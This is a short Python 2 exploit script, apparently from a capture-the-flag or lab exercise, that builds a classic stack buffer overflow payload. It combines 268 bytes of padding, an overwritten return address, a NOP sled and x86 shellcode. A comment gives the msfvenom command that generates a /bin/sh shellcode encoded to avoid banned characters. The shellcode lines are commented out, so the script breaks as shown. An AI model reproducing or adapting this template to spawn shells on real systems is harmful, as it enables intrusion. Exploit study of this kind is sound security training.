#!/bin/env python2
import struct
# import os
# import subprocess
#Banned characters 
# [hijklmn] or [0x68 - 0x6e]

"""Constants"""
len_to_addr = 268
ret_addr = 0xbffff540
char = "A"
nop = "\x90"
"""Shell Code (x86)"""
# buf =  b""
# buf += b"\x31\xc9\x83\xe9\xfa\xe8\xff\xff\xff\xff\xc0\x5e\x81"
# buf += b"\x76\x0e\xc1\x82\x26\x2a\x83\xee\xfc\xe2\xf4\xf0\x42"
# buf += b"\x76\x42\xee\xad\x55\x42\xa9\xad\x44\x43\xaf\x0b\xc5"
# buf += b"\x7a\x92\x0b\xc7\x9a\xca\x4f\xa6\x2a"

"""Executable"""
EIP = struct.pack("I", ret_addr)
padding = char * (len_to_addr)
NOP_SLED = nop * 20
payload =  padding + EIP + NOP_SLED + buf
print payload
# print len(buf)
# print EIP
#msfvenom -p linux/x86/exec CMD=/bin/sh -a x86 --platform linux -e x86/shikata_ga_nai -f python -b '\x00\x68\x69\x6a\x6b\x6c\x6d\x6e'
